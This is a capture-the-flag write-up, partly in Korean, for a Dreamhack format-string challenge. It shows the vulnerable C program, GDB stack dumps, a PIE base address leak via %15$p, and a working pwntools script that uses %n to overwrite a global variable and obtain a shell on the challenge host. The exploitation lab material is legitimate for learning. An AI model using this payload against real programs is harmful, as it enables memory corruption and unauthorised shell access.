# 🚩 [Format String Bug]

> **Category:** Pwnable  
> **Difficulty:** <span style="color: #FFD700; font-weight: bold;">G4</span>  
> **Flag:** `DH{--}`  

---

## 📄 1. Challenge Description
* **Environment :**
  ```text
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
* **Reference :**
  ```text
    Format String Bug
---

## 🔍 2. Vulnerability Analysis

이 문제는 **Position-Independent Executable(PIE)**가 적용되어 있어 코드영역의 주소가 계속 바뀜니다. 따라서 **1) Offset**을 구한후 **2) changeme**함수의 주소를 계산해야 합니다.

### Code Review & Vulnerable Points
C 언어 의사 코드(Decompiled Code) 및 핵심 메뉴 기능 분석:

```c
// Name: fsb_overwrite.c
// Compile: gcc -o fsb_overwrite fsb_overwrite.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void get_string(char *buf, size_t size) {
  ssize_t i = read(0, buf, size);
  if (i == -1) {
    perror("read");
    exit(1);
  }
  if (i < size) {
    if (i > 0 && buf[i - 1] == '\n') i--;
    buf[i] = 0;
  }
}

int changeme;

int main() {
  char buf[0x20];
  
  setbuf(stdout, NULL);
  
  while (1) {
    get_string(buf, 0x20);
    printf(buf);                     // Format String Bug 가능
    puts("");
    if (changeme == 1337) {          // changeme를 1337로 바꾸면 성공
      system("/bin/sh");
    }
  }
}
```
## 🗡️ 3. Exploit Scenario (공격 시나리오)

1. **changeme 주소 구하기:**
   * PIE기법으로 `changeme`주소가 계속 바뀐다.
   * FSB를 통해 PIE 베이스 주소를 알아낸다.

2. **changeme를 1337로 변경하기:**
   * `get_string`으로 `changeme`의 주소를 스택에 저장합니다.
   * `printf`함수에서 `%n`으로 `changeme`의 값을 조작합니다.

3. **Shell 획득 및 Flag 획득**

---


## 🕵️‍♀️ 4. Appendix: GDB Disassembly & Analysis (GDB 분석)

### 1. changeme 주소 구하기
`printf`함수가 호출되는 곳에 브레이크포인트를 설정후 `run` 실행.

```assembly
$ gdb -q fsb_overwrite
pwndbg> disass main
Dump of assembler code for function main:
...
   0x00000000000012d3 <+64>:    lea    rax,[rbp-0x30]
   0x00000000000012d7 <+68>:    mov    rdi,rax
   0x00000000000012da <+71>:    mov    eax,0x0
   0x00000000000012df <+76>:    call   0x10e0 <printf@plt>
...
End of assembler dump.
pwndbg> b *main+76
Breakpoint 1 at 0x12df
pwndbg> r
Starting program: /home/dreamhack/fsb_overwrite
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
aaaaa

Breakpoint 1, 0x00005555555552df in main ()
...
──────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────
 ► 0x5555555552df <main+76>     call   printf@plt                <printf@plt>
        format: 0x7fffffffe2d0 ◂— 0x6161616161 /* 'aaaaa' */
        vararg: 0x7fffffffe2d0 ◂— 0x6161616161 /* 'aaaaa' */

   0x5555555552e4 <main+81>     lea    rax, [rip + 0xd1e]
   0x5555555552eb <main+88>     mov    rdi, rax
   0x5555555552ee <main+91>     call   puts@plt                <puts@plt>
...

```
그 이후 `x/32gx $rsp`명령어 실행

```assembly
pwndbg> x/32gx $rsp
0x7fffffffe2d0:	0x0000006161616161	0x0000000000000000
0x7fffffffe2e0:	0x0000000000000000	0x0000000000000000
0x7fffffffe2f0:	0x0000000000000000	0x77c8b8abdc839b00
0x7fffffffe300:	0x0000000000000001	0x00007ffff7dabd90
0x7fffffffe310:	0x0000000000000000	0x0000555555555293
0x7fffffffe320:	0x0000000100000000	0x00007fffffffe418
0x7fffffffe330:	0x0000000000000000	0x1e535541fc844cd1
0x7fffffffe340:	0x00007fffffffe418	0x0000555555555293
0x7fffffffe350:	0x0000555555557d90	0x00007ffff7ffd040
0x7fffffffe360:	0xe1acaabe3aa64cd1	0xe1acbaf4860e4cd1
0x7fffffffe370:	0x00007fff00000000	0x0000000000000000
0x7fffffffe380:	0x0000000000000000	0x0000000000000000
0x7fffffffe390:	0x0000000000000000	0x77c8b8abdc839b00
0x7fffffffe3a0:	0x0000000000000000	0x00007ffff7dabe40
0x7fffffffe3b0:	0x00007fffffffe428	0x0000555555557d90
0x7fffffffe3c0:	0x00007ffff7ffe2e0	0x0000000000000000
```
위와 같이 `RSP+0x48`위치에 `0x555555555293`가 저장되어 있다.
그 후 vmmap으로 확인하면 `fsb_overwrite`바이너리가 매핑된 영역에 포함되는 주소이므로 이 주소로 PIE 베이스 주소를 구할 수 있다.

```assembly
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x555555554000     0x555555555000 r--p     1000      0 /home/dremahack/fsb_overwrite
    0x555555555000     0x555555556000 r-xp     1000   1000 /home/dremahack/fsb_overwrite
    0x555555556000     0x555555557000 r--p     1000   2000 /home/dremahack/fsb_overwrite
    0x555555557000     0x555555558000 r--p     1000   2000 /home/dremahack/fsb_overwrite
    0x555555558000     0x555555559000 rw-p     1000   3000 /home/dremahack/fsb_overwrite
[생략]
```

* ** PIE 베이스 주소 간의 오프셋:** `0x555555555293 - 555555554000 = 0x1293` 

---

### 2. changeme 주소

`%15$p`를 입력해서 `[RSP+0x48]`의 주소 값에서 `0x1293`을 빼면 PIE 베이스 주소가 된다.
그 주소에 `changeme`의 오프셋을 더하면 `changeme`의 주소를 구할 수 있습니다.
`changeme`의 오프셋은 `readelf`명령어로 확인 가능하다.

```assembly
$ readelf -s fsb_overwrite | grep changeme
    40: 000000000000401c     4 OBJECT  GLOBAL DEFAULT   26 changeme
```

---

## 💥 5. Exploit Script (`ex.py`)

```python
from pwn import *

#p = process("./fsb_overwrite")
p = remote("host3.dreamhack.games", 21942)

offset = 0x1293
changeme = 0x401c

p.sendline(b"%15$p")

leaked = int(p.recvline()[:-1],16)
code_base = leaked - offset
changeme = code_base + changeme

payload = b"%1337c"
payload += b"%8$n"
payload += b"a" * 6
payload = payload + p64(changeme)

p.sendline(payload)

p.interactive()
```
---




## 💡 6. Code Analysis & Deep Dive (주요 포인트 분석)

* **changeme 주소 구하기 (PIE 기법):**
* **changeme 값 수정 (FSB 이용):**

---

## 🎓 7. Retrospective / Takeaways (요약 및 느낀 점)

* PIE기법이 적용된 문제를 푸는 방법을 배웠다.
* Format String Bug(FSB)를 통해 임의 주소 읽기, 임의 주소 쓰기 등에 대해 배웠다.
